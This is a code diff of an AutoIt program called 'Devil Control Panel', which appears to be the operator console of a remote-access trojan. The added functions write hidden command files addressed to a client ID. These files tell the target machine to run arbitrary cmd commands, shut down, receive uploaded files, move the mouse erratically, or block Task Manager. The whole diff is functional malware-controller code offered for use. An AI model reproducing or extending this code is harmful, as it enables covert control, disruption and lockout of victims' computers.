@@ -43,9 +43,8 @@ GUISetBkColor(0xFFFFFF)
 $Group1 = GUICtrlCreateGroup("Actions", 16, 48, 265, 153)
 $ShowMessageBox_Button = GUICtrlCreateButton("SHOW MESSAGE BOX", 24, 72, 251, 25)
 $ExecuteToCMD_Button = GUICtrlCreateButton("EXECUTE TO CMD", 24, 104, 251, 25)
-$Shutdown_Button = GUICtrlCreateButton("SHUTDOWN", 24, 136, 251, 25)
-$LoadFile_Button = GUICtrlCreateButton("LOAD FILE", 24, 168, 123, 25)
-$WriteLogs_Button = GUICtrlCreateButton("WRITE LOGS", 160, 168, 115, 25)
+$SystemShutdown_Button = GUICtrlCreateButton("SHUTDOWN", 24, 136, 251, 25)
+$LoadFile_Button = GUICtrlCreateButton("LOAD FILE", 24, 168, 251, 25)
 GUICtrlCreateGroup("", -99, -99, 1, 1)
 $Text = GUICtrlCreateLabel("Client ID", 16, 18, 62, 20)
 GUICtrlSetFont(-1, 10, 800, 0, "MS Sans Serif")
@@ -72,13 +71,19 @@ While True
         Case $ShowMessageBox_Button
             ShowMessageBox()
         Case $ExecuteToCMD_Button
-        Case $Shutdown_Button
+            ExecuteToCMD()
+        Case $SystemShutdown_Button
+            SystemShutdown()
         Case $LoadFile_Button
-        Case $WriteLogs_Button
+            LoadFile()
         Case $CrazyMouse_EnableButton
+            EnableCrazyMouse()
         Case $CrazyMouse_DisableButton
+            DisableCrazyMouse()
         Case $BlockTaskManager_EnableButton
+            EnableBlockTaskManager()
         Case $BlockTaskManager_DisableButton
+            DisableBlockTaskManager()
 	EndSwitch
 WEnd
 
@@ -90,14 +95,153 @@ Func ShowMessageBox()
     If $ClientID = "" Then
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
-        FileCopy("Data_example.ini", $Server_Directory & "\" & $ClientID & "_temp")
-        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
         Local $MessageBox_Text = InputBox("Devil ControlPanel", "Enter the text that will be displayed.", "", "", 270, 130)
-        IniWrite($Server_Directory & "\" & $ClientID & "_temp", "Data", "Type", "show_message")
-        IniWrite($Server_Directory & "\" & $ClientID & "_temp", "Data", "Command", $MessageBox_Text)
+        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+        FileWriteLine($Temp_DataFile, "[Data]")
+        FileWriteLine($Temp_DataFile, "Type=message")
+        FileWriteLine($Temp_DataFile, "Command=" & $MessageBox_Text)
         FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
-        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
         FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+        FileClose($Temp_DataFile)
+        Sleep(1000) 
+    EndIf
+EndFunc
+
+; Execute CMD command
+Func ExecuteToCMD()
+    $ClientID = GUICtrlRead($InputBox)
+    If $ClientID = "" Then
+        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
+    Else
+        Local $CMD_Command = InputBox("Devil ControlPanel", "Enter the cmd command.", "", "", 270, 130)
+        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+        FileWriteLine($Temp_DataFile, "[Data]")
+        FileWriteLine($Temp_DataFile, "Type=execute_command")
+        FileWriteLine($Temp_DataFile, "Command=" & $CMD_Command)
+        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+        FileClose($Temp_DataFile)
+        Sleep(1000) 
+    EndIf
+EndFunc
+
+; Shutdown system
+Func SystemShutdown()
+    $ClientID = GUICtrlRead($InputBox)
+    If $ClientID = "" Then
+        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
+    Else
+        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+        FileWriteLine($Temp_DataFile, "[Data]")
+        FileWriteLine($Temp_DataFile, "Type=shutdown")
+        FileWriteLine($Temp_DataFile, "Command=")
+        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+        FileClose($Temp_DataFile)
+        Sleep(1000) 
+    EndIf
+EndFunc
+
+; Load file to the system
+Func LoadFile()
+    $ClientID = GUICtrlRead($InputBox)
+    If $ClientID = "" Then
+        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
+    Else
+        Local $File_To_Load = FileOpenDialog("Select the file, that must be uploaded!", "C:\", "All (*.*)" )
+        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+        Local $File_Name = _PathSplit($File_To_Load, -1, -1, -1, -1) ; Get file name
+        FileCopy($File_To_Load, $Server_Directory)
+        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+        FileWriteLine($Temp_DataFile, "[Data]")
+        FileWriteLine($Temp_DataFile, "Type=load_file")
+        FileWriteLine($Temp_DataFile, "Command=" & $File_Name[3] & $File_Name[4])
+        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+        FileClose($Temp_DataFile)
+        Sleep(1000) 
+    EndIf
+EndFunc
+
+; Enable CrazyMouse
+Func EnableCrazyMouse()
+    $ClientID = GUICtrlRead($InputBox)
+    If $ClientID = "" Then
+        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
+    Else
+        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+        FileWriteLine($Temp_DataFile, "[Data]")
+        FileWriteLine($Temp_DataFile, "Type=crazy_mouse")
+        FileWriteLine($Temp_DataFile, "Command=True")
+        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+        FileClose($Temp_DataFile)
+        Sleep(1000) 
+    EndIf
+EndFunc
+
+; Disable CrazyMouse
+Func DisableCrazyMouse()
+    $ClientID = GUICtrlRead($InputBox)
+    If $ClientID = "" Then
+        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
+    Else
+        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+        FileWriteLine($Temp_DataFile, "[Data]")
+        FileWriteLine($Temp_DataFile, "Type=crazy_mouse")
+        FileWriteLine($Temp_DataFile, "Command=False")
+        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+        FileClose($Temp_DataFile)
+        Sleep(1000) 
+    EndIf
+EndFunc
+
+; Enable block task manager
+Func EnableBlockTaskManager()
+    $ClientID = GUICtrlRead($InputBox)
+    If $ClientID = "" Then
+        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
+    Else
+        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+        FileWriteLine($Temp_DataFile, "[Data]")
+        FileWriteLine($Temp_DataFile, "Type=block_task_manager")
+        FileWriteLine($Temp_DataFile, "Command=True")
+        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+        FileClose($Temp_DataFile)
+        Sleep(1000) 
+    EndIf
+EndFunc
+
+; Disable block task manager
+Func DisableBlockTaskManager()
+    $ClientID = GUICtrlRead($InputBox)
+    If $ClientID = "" Then
+        MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
+    Else
+        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+        FileWriteLine($Temp_DataFile, "[Data]")
+        FileWriteLine($Temp_DataFile, "Type=block_task_manager")
+        FileWriteLine($Temp_DataFile, "Command=False")
+        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+        FileClose($Temp_DataFile)
         Sleep(1000) 
     EndIf
 EndFunc
